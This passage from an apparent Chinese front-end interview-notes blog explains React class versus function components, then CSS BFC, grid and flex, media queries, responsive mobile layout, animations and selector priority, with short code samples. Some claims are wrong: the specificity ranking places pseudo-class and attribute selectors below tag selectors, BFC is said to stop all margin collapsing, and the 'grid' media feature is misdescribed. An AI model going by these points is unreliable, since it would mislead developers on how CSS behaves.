随着React的优化，函数组件和类组件之间的性能差距已经减小，甚至在某些情况下函数组件可能更快。</p></li></ol><p>总结来说，函数组件是React中的趋势，因为它们更简洁、易于理解和维护，尤其是在使用React Hooks时。在新的React项目中，建议优先选择函数组件，除非需要使用类组件的特定功能或在已有的类组件中进行维护。</p><p>需要注意的是，React社区不断发展，新的特性和最佳实践可能会随着时间的推移而变化，因此请查看官方文档以获取最新的建议和指南。</p><h5 id="类组件相对于函数式组件有什么优势"><a href="#类组件相对于函数式组件有什么优势" class="headerlink" title="类组件相对于函数式组件有什么优势"></a>类组件相对于函数式组件有什么优势</h5><p>虽然函数式组件在React中变得非常流行，但类组件仍然具有一些优势，尤其是在特定情况下。以下是一些类组件相对于函数式组件的优势：</p><ol><li><p><strong>状态管理的能力：</strong> 类组件可以更灵活地处理组件的状态（state）。它们可以通过 <code>this.state</code> 和 <code>this.setState()</code> 来管理本地状态，这使得它们非常适合处理复杂的组件状态。在某些情况下，使用 <code>setState</code> 的回调函数也可以更精细地控制状态更新。</p></li><li><p><strong>生命周期方法：</strong> 类组件具有一系列生命周期方法，如 <code>componentDidMount</code>、<code>componentDidUpdate</code> 和 <code>componentWillUnmount</code> 等，这些方法允许你在组件的不同生命周期阶段执行特定的操作。例如，你可以在 <code>componentDidMount</code> 中进行数据获取，或在 <code>componentDidUpdate</code> 中处理DOM操作。这些方法在某些情况下非常有用。</p></li><li><p><strong>容器组件：</strong> 类组件通常用作容器组件，它们可以包含和管理多个子组件。这使得它们在组织和管理复杂的UI组件结构时非常有用。容器组件可以将数据传递给子组件，并将子组件的状态提升到自己的状态中。</p></li><li><p><strong>组件实例：</strong> 类组件创建的是组件实例，你可以在组件实例中存储数据、引用DOM元素、维护特定的状态等。这些实例具有更多的生命周期控制和数据管理选项。</p></li><li><p><strong>历史：</strong> 类组件是React的传统方式，许多旧代码库和教程中仍然使用类组件。如果你维护或与这些代码库一起工作，了解类组件仍然很有价值。</p></li><li><p><strong>PropTypes：</strong> 类组件通常使用PropTypes来进行类型检查和验证。虽然PropTypes也可以用于函数组件，但它们更常用于类组件。</p></li></ol><p>需要注意的是，尽管类组件具有这些优势，但React社区正在积极推动函数式组件和React Hooks的使用。函数式组件在代码的可读性和可维护性方面通常更好，因此在新项目中或在不需要类组件特定功能的情况下，函数式组件更受欢迎。此外，React团队还在不断改进和优化函数式组件的性能。</p><p>在选择类组件或函数式组件时，最重要的是根据项目的需求和团队的偏好来做出决策。你可以根据具体情况选择最适合你的组件类型。</p><h5 id="类组件的super"><a href="#类组件的super" class="headerlink" title="类组件的super"></a>类组件的super</h5><p>在React类组件中，<code>super()</code> 是用于调用父类构造函数的关键字。具体来说，它在子类的构造函数中用于调用父类的构造函数，以确保子类在初始化时继承了父类的属性和方法。</p><p>当你创建一个自定义的React类组件时，通常会继承<code>React.Component</code>或<code>React.PureComponent</code>，这是React提供的基类。为了确保子类正确地继承父类的功能，你需要在子类的构造函数中调用<code>super(props)</code>，将<code>props</code>参数传递给父类的构造函数。</p><p>以下是一个示例，演示了如何在React类组件中使用<code>super()</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; <span class="hljs-title class_">Component</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props); <span class="hljs-comment">// 调用父类构造函数并传递props参数</span><br>    <span class="hljs-comment">// 在这里可以初始化组件的状态</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;<br>      <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,<br>    &#125;;<br>  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Count: &#123;this.state.count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;this.increment&#125;</span>&gt;</span>Increment<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    );<br>  &#125;<br><br>  increment = <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// 在事件处理程序中更新状态</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">count</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">MyComponent</span>;<br></code></pre></td></tr></table></figure><p>在上面的示例中，<code>super(props)</code> 调用了<code>Component</code>的构造函数，确保了<code>MyComponent</code>继承了<code>Component</code>的所有功能。这样，你就可以在<code>MyComponent</code>中使用React的生命周期方法和其他功能。</p><p>需要注意的是，如果你在构造函数中使用<code>super()</code>，则必须在调用<code>super()</code>之后再访问<code>this</code>，因为<code>this</code>在<code>super()</code>之前是不可用的。这是因为在调用<code>super()</code>之前，父类的构造函数尚未执行完毕。</p><h2 id="css篇"><a href="#css篇" class="headerlink" title="css篇"></a>css篇</h2><h3 id="x3D-x3D-1、bfc-x3D-x3D"><a href="#x3D-x3D-1、bfc-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;1、bfc&#x3D;&#x3D;"></a>&#x3D;&#x3D;1、bfc&#x3D;&#x3D;</h3><p>BFC（Block Formatting Context）是CSS中的一个重要概念，它用于控制和管理块级元素在文档流中的排布和布局。BFC的主要作用是解决页面布局和元素浮动时可能出现的问题，以及控制块级元素的尺寸和位置。</p><p>以下是BFC的主要作用：</p><ol><li><p><strong>清除浮动（Clearing Floats）</strong>：一个元素如果形成BFC，它的边框将会包围住浮动元素，从而防止浮动元素覆盖在它上面。这通常用于清除浮动元素的影响，以确保父元素能够正确包含浮动子元素。</p></li><li><p><strong>阻止外边距合并（Preventing Margin Collapsing）</strong>：在普通文档流中，相邻的垂直外边距有时会发生外边距合并（margin collapsing），导致外边距的合并值不如预期。在BFC中，外边距不会发生合并，从而确保了元素间的间隔。</p></li><li><p><strong>控制元素尺寸（Controlling Element Dimensions）</strong>：BFC可以包含块级格式化上下文中的子元素，从而影响这些子元素的尺寸和位置。这使得元素在布局时更容易控制。</p></li><li><p><strong>防止元素被浮动元素覆盖（Preventing Overlap with Floats）</strong>：在BFC中，元素的边框将会包围住浮动元素，防止浮动元素覆盖在它上面。</p></li><li><p><strong>在多列布局中的应用（Used in Multi-Column Layouts）</strong>：BFC在多列布局中也有应用，可以用于控制列的布局和边距。</p></li></ol><p>要创建一个BFC，可以使用以下方法之一：</p><ul><li>设置元素的 <code>overflow</code> 属性值为非 <code>visible</code>（例如，<code>overflow: auto</code> 或 <code>overflow: hidden</code>）。</li><li>设置元素的 <code>display</code> 属性值为 <code>table-cell</code>、<code>table-caption</code>、<code>table-row</code>、<code>flex</code>、<code>inline-block</code> 等值。</li><li>创建一个新的块级格式化上下文，可以通过在父元素上应用 <code>display: flow-root</code> 或 <code>contain: layout</code> 来实现。</li></ul><p>总的来说，BFC是CSS中一个重要的概念，用于解决布局和浮动相关的问题，以及控制块级元素的排布和尺寸。理解BFC对于实现复杂的页面布局和避免布局问题非常重要。</p><p><strong>BFC的应用场景：</strong></p><ol><li><strong>清除浮动：</strong> 使用BFC可以轻松地清除浮动，防止浮动元素影响到布局。</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.clearfix</span> &#123;<br>  <span class="hljs-attribute">overflow</span>: auto; <span class="hljs-comment">/* 或者 overflow: hidden; */</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>防止边距合并：</strong> 如果你不希望相邻元素的边距合并，可以将它们放置在不同的BFC中。</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">overflow</span>: hidden;<br>&#125;<br><br><span class="hljs-comment">/* 或者使用display: flow-root; */</span><br><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: flow-root;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>包含浮动：</strong> 如果一个容器中包含浮动元素，可以使用BFC来使容器正确包裹浮动元素，以防止父元素高度塌陷。</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">overflow</span>: hidden;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4"><li><strong>实现两栏布局：</strong> 使用BFC可以轻松实现两栏布局，其中一个栏固定宽度，另一个栏自适应剩余宽度。</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-id">#left</span> &#123;<br>  <span class="hljs-attribute">float</span>: left;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<br>&#125;<br><br><span class="hljs-selector-id">#right</span> &#123;<br>  <span class="hljs-attribute">overflow</span>: hidden; <span class="hljs-comment">/* 创建BFC */</span><br>&#125;<br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902181520963-20230902%2018:15:21.png" alt="image-20230902181520963" style="zoom:50%;" /><p>总之，BFC是Web页面布局中一个非常有用的概念，它解决了一些常见的布局问题，如浮动清除、边距合并和包含浮动元素。了解BFC的特性和应用场景可以帮助你更好地控制和优化页面布局。</p><h3 id="2、grid布局和flex布局区别"><a href="#2、grid布局和flex布局区别" class="headerlink" title="2、grid布局和flex布局区别"></a>2、grid布局和flex布局区别</h3><p>Grid 布局（CSS Grid Layout）和 Flex 布局（CSS Flexible Box Layout）是两种不同的CSS布局模型，用于在网页中管理和定位元素。它们有一些重要的区别，适用于不同的布局需求和场景：</p><ol><li><p><strong>布局方向：</strong></p><ul><li><strong>Grid 布局：</strong> Grid 布局是一个二维布局模型，可以同时控制行和列，允许您创建复杂的网格结构，适用于需要在两个方向上对齐和分布元素的情况。</li><li><strong>Flex 布局：</strong> Flex 布局是一个一维布局模型，主要用于沿一个主轴（通常是水平或垂直）对齐和分布元素。它适用于构建灵活的单行或单列布局。</li></ul></li><li><p><strong>适用场景：</strong></p><ul><li><strong>Grid 布局：</strong> 适用于复杂的网格结构，例如网格布局、平铺布局、定位元素等，特别适用于构建多列和多行的布局。</li><li><strong>Flex 布局：</strong> 适用于单行或单列的布局，例如导航菜单、工具栏、垂直居中等。</li></ul></li><li><p><strong>元素排序：</strong></p><ul><li><strong>Grid 布局：</strong> Grid 布局使得元素的位置相对于网格单元格而言更为自由，元素可以跨越多个行和列，因此可以实现复杂的布局。</li><li><strong>Flex 布局：</strong> Flex 布局通常按照它们在主轴上的顺序排列，元素的顺序在主轴上具有重要意义，可以轻松重新排列元素的顺序。</li></ul></li><li><p><strong>对齐方式：</strong></p><ul><li><strong>Grid 布局：</strong> Grid 布局提供了多种对齐方式，可以在水平和垂直方向上分别控制元素的对齐方式。</li><li><strong>Flex 布局：</strong> Flex 布局主要关注主轴上的对齐，可以控制元素在主轴上的对齐方式，但在交叉轴上的对齐相对较少。</li></ul></li><li><p><strong>嵌套布局：</strong></p><ul><li><strong>Grid 布局：</strong> Grid 布局可以嵌套，您可以在一个网格容器内再创建一个子网格，以实现更复杂的布局。</li><li><strong>Flex 布局：</strong> Flex 布局也可以嵌套，但子 Flex 容器的布局相对独立，不会直接影响父 Flex 容器的布局。</li></ul></li></ol><p>综上所述，Grid 布局和 Flex 布局都是有用的CSS布局工具，根据具体的布局需求和设计要求来选择使用哪种布局模型。通常情况下，Grid 布局更适合用于创建复杂的网格结构，而 Flex 布局更适合用于简单的一维排列和对齐。在实际开发中，它们也可以结合使用，根据需要选择不同的布局模型。</p><h3 id="3、媒体查询原理"><a href="#3、媒体查询原理" class="headerlink" title="3、媒体查询原理"></a>3、媒体查询原理</h3><p>媒体查询（Media Queries）是CSS3中的一个重要特性，它允许您根据设备的特征和属性（如屏幕宽度、屏幕高度、设备方向、分辨率等）来应用不同的CSS样式。媒体查询的原理基于以下几个关键概念：</p><ol><li><p><strong>媒体查询语法：</strong> 媒体查询通过使用 <code>@media</code> 块来定义，其语法如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> media-type <span class="hljs-keyword">and</span> (media-features) &#123;<br>  <span class="hljs-comment">/* 在此定义样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>media-type</code> 表示要应用媒体查询的设备类型，如 <code>screen</code>（屏幕）、<code>print</code>（打印机）等。</li><li><code>media-features</code> 表示要匹配的媒体特性和条件，如 <code>max-width</code>（最大宽度）、<code>min-width</code>（最小宽度）、<code>orientation</code>（方向）等。</li></ul></li><li><p><strong>媒体查询条件：</strong> 在媒体查询中，您可以使用各种媒体特性来定义条件，以决定是否应用其中的样式规则。一些常见的媒体特性包括：</p><ul><li><code>width</code>：屏幕或视口的宽度。</li><li><code>height</code>：屏幕或视口的高度。</li><li><code>orientation</code>：设备的方向，可以是 <code>portrait</code>（纵向）或 <code>landscape</code>（横向）。</li><li><code>resolution</code>：设备的分辨率。</li><li><code>aspect-ratio</code>：屏幕或视口的宽高比。</li><li><code>color</code>：设备的色彩位深。</li><li><code>grid</code>：检测设备是否支持网格布局。</li></ul></li><li><p><strong>条件匹配：</strong> 媒体查询中的条件会与用户设备的实际属性进行比较，如果条件满足，媒体查询块内的样式规则将被应用。如果条件不满足，媒体查询块内的样式规则将被忽略。</p></li><li><p><strong>级联规则：</strong> 媒体查询可以进行级联，多个媒体查询条件可以一起使用，以便更精确地匹配各种设备和情况。多个条件之间可以使用 <code>and</code>、<code>not</code> 和 <code>only</code> 连接起来。</p></li></ol><p>下面是一个示例，演示了如何使用媒体查询来根据屏幕宽度应用不同的CSS样式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 如果屏幕宽度小于等于600像素，则应用以下样式 */</span><br><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">600px</span>) &#123;<br>  <span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: lightblue;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/* 如果屏幕宽度大于600像素，则应用以下样式 */</span><br><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">601px</span>) &#123;<br>  <span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: lightgreen;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上述代码中，两个媒体查询块分别根据屏幕宽度的条件应用不同的背景颜色样式。</p><p>媒体查询使得响应式设计变得更加容易，您可以根据不同设备和屏幕属性来调整页面的外观和布局，以提供更好的用户体验。媒体查询是现代Web设计的重要工具，有助于创建适应各种设备和屏幕尺寸的网页。</p><h3 id="4、移动端如何实现自适应"><a href="#4、移动端如何实现自适应" class="headerlink" title="4、移动端如何实现自适应"></a>4、移动端如何实现自适应</h3><p>在移动端实现自适应布局是确保网页在不同移动设备上能够以最佳方式呈现的重要步骤。以下是一些常见的方法来实现移动端自适应布局：</p><ol><li><p><strong>使用Viewport设置：</strong> 使用Viewport（视口）设置是移动端自适应布局的基础。Viewport是一个虚拟的浏览器窗口，它决定了网页在移动设备上的可见区域大小。通过以下的HTML标签，可以设置Viewport：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>width=device-width</code>：使Viewport的宽度等于设备屏幕的宽度。</li><li><code>initial-scale=1.0</code>：设置初始缩放比例为1，确保网页以设备的实际分辨率呈现。</li></ul></li><li><p><strong>使用百分比布局：</strong> 使用百分比布局是一种简单的方法，可以使元素的宽度和高度相对于其容器的百分比。这样，元素会根据容器的大小进行自适应调整。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;<br>&#125;<br><br><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">float</span>: left;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>弹性布局（Flexbox）：</strong> CSS的Flexbox布局是一种强大的布局模型，适用于移动端自适应布局。它可以轻松地实现灵活的、响应式的布局。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-wrap</span>: wrap;<br>&#125;<br><br><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>  <span class="hljs-attribute">min-width</span>: <span class="hljs-number">100px</span>; <span class="hljs-comment">/* 控制最小宽度 */</span><br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">10px</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>媒体查询（Media Queries）：</strong> 媒体查询允许你根据屏幕尺寸、分辨率或设备特性来应用不同的CSS样式。这允许你为不同的设备或屏幕大小定制样式。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">768px</span>) &#123;<br>  <span class="hljs-comment">/* 在小屏幕上应用的样式 */</span><br>&#125;<br><br><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">769px</span>) &#123;<br>  <span class="hljs-comment">/* 在大屏幕上应用的样式 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>CSS Grid布局：</strong> CSS Grid布局是一种强大的二维布局系统，它可以用于创建复杂的自适应布局，适用于各种屏幕尺寸。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">200px</span>, <span class="hljs-number">1</span>fr));<br>  <span class="hljs-attribute">grid-gap</span>: <span class="hljs-number">10px</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>使用rem单位：</strong> 前面提到过，使用rem单位可以根据根元素的字体大小来设置元素的尺寸，实现相对于根元素的自适应布局。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">html</span> &#123;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>; <span class="hljs-comment">/* 设置根元素字体大小 */</span><br>&#125;<br><br><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">2rem</span>; <span class="hljs-comment">/* 相对于根元素的字体大小，即32px */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>CSS预处理器：</strong> 如果你使用CSS预处理器（如Sass或Less），它们通常提供了更灵活的布局工具，可以更轻松地实现自适应布局。</p></li></ol><p>总之，移动端自适应布局涉及多个因素，包括Viewport设置、CSS布局模型、媒体查询和单位选择。根据你的项目需求，可以选择合适的方法或组合多种方法来实现自适应布局，以确保你的网页在不同移动设备上具有良好的用户体验。</p><h3 id="5、css有哪些动画实现方式"><a href="#5、css有哪些动画实现方式" class="headerlink" title="5、css有哪些动画实现方式"></a>5、css有哪些动画实现方式</h3><p>在 CSS 中，有多种方式可以实现动画效果，这些方式可以用来创建各种交互性和视觉上的动画效果。以下是常见的 CSS 动画实现方式：</p><ol><li><p><strong>CSS Transitions（过渡动画）：</strong> 过渡动画通过指定属性的起始值和结束值来实现动画效果。它们通常用于在状态变化时添加平滑的过渡效果。使用 <code>transition</code> 属性来定义过渡属性、持续时间和时间函数。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 示例：在:hover状态下，改变背景颜色 */</span><br><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ff0000</span>;<br>  <span class="hljs-attribute">transition</span>: background-color <span class="hljs-number">0.3s</span> ease;<br>&#125;<br><span class="hljs-selector-class">.box</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#00ff00</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>CSS Animations（关键帧动画）：</strong> 关键帧动画允许你创建更复杂的动画，通过定义关键帧（动画序列中的特定时间点）来控制属性的变化。使用 <code>@keyframes</code> 规则定义关键帧动画。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 示例：使用关键帧动画旋转元素 */</span><br><span class="hljs-keyword">@keyframes</span> rotate &#123;<br>  <span class="hljs-selector-tag">from</span> &#123;<br>    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">0deg</span>);<br>  &#125;<br>  <span class="hljs-selector-tag">to</span> &#123;<br>    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">360deg</span>);<br>  &#125;<br>&#125;<br><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">animation</span>: rotate <span class="hljs-number">2s</span> linear infinite;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>CSS Transforms（变换动画）：</strong> 变换动画允许元素在平面内或3D空间内进行平移、旋转、缩放和倾斜。这些变换可以用来创建复杂的动画效果。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 示例：使用变换动画平移元素 */</span><br><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">100px</span>);<br>  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span> ease;<br>&#125;<br><span class="hljs-selector-class">.box</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">200px</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>CSS Transitions 和 JavaScript 结合使用：</strong> 可以使用 JavaScript 来触发 CSS 过渡或动画的开始，例如，通过添加或删除 CSS 类来控制动画的触发。</p></li><li><p><strong>SVG 动画：</strong> 如果你正在处理可伸缩矢量图形 (SVG)，那么你可以使用 SVG 属性和元素来创建各种动画效果，如 <code>animate</code> 和 <code>animateTransform</code> 元素。</p></li><li><p><strong>CSS Grid 和 Flexbox 布局动画：</strong> 使用 CSS Grid 和 Flexbox 布局可以实现元素在布局中的动态调整，从而创建动画效果。</p></li><li><p><strong>CSS 绘制动画：</strong> 通过使用 CSS <code>clip-path</code> 属性、<code>mask</code> 属性、CSS Shapes 等技术，可以创建一些非常有趣的绘制动画。</p></li><li><p><strong>第三方 CSS 动画库：</strong> 除了原生 CSS 动画，还有许多第三方 CSS 动画库，如 Animate.css、GSAP（GreenSock Animation Platform）等，它们提供了丰富的预定义动画效果和更高级的控制选项。</p></li></ol><p>选择合适的动画实现方式取决于你的具体需求和所要实现的效果。对于简单的过渡效果，使用 CSS 过渡可能足够；对于更复杂的动画，可能需要使用关键帧动画或第三方动画库。在动画设计中，也要考虑性能和可访问性方面的问题。</p><h3 id="6、css选择器及优先级"><a href="#6、css选择器及优先级" class="headerlink" title="6、css选择器及优先级"></a>6、css选择器及优先级</h3><p>CSS（层叠样式表）选择器用于选择 HTML 元素并为其应用样式。选择器的优先级决定了当多个选择器同时匹配同一元素时，哪个样式规则将应用于元素。CSS 选择器的优先级是基于选择器的特定性（specificity）和重要性（!important）来计算的。</p><p>以下是一些常见的 CSS 选择器以及它们的优先级（从高到低）：</p><ol><li><p><strong>ID 选择器（#id）：</strong> ID 选择器具有最高的特定性，因此优先级最高。例如：<code>#myElement &#123; color: red; &#125;</code></p></li><li><p><strong>类选择器（.class）：</strong> 类选择器在特定性上低于 ID 选择器，但高于标签选择器。例如：<code>.button &#123; background-color: blue; &#125;</code></p></li><li><p><strong>标签选择器（element）：</strong> 标签选择器是根据 HTML 元素的标签名称来选择元素的。例如：<code>p &#123; font-size: 16px; &#125;</code></p></li><li><p><strong>伪类选择器（:pseudo-class）：</strong> 伪类选择器用于选择元素的特殊状态或位置，如 <code>:hover</code>、<code>:first-child</code> 等。它们的特定性较低。例如：<code>a:hover &#123; text-decoration: underline; &#125;</code></p></li><li><p><strong>属性选择器（[attribute]）：</strong> 属性选择器根据元素的属性来选择元素，如 <code>[data-toggle=&quot;modal&quot;]</code>。它们的特定性较低。</p></li><li><p><strong>通配选择器（*）：</strong> 通配选择器具有最低的特定性，会匹配所有元素。例如：<code>* &#123; margin: 0; &#125;</code></p></li><li><p><strong>重要性（!important）：</strong> 使用 <code>!important</code> 标志的样式规则具有最高的优先级，无论特定性如何。例如：<code>color: red !important;</code></p></li></ol><p>CSS 选择器的特定性是根据选择器中包含的 ID、类、标签和伪类的数量和顺序来计算的。通常，特定性是一个三位数，依次表示 ID 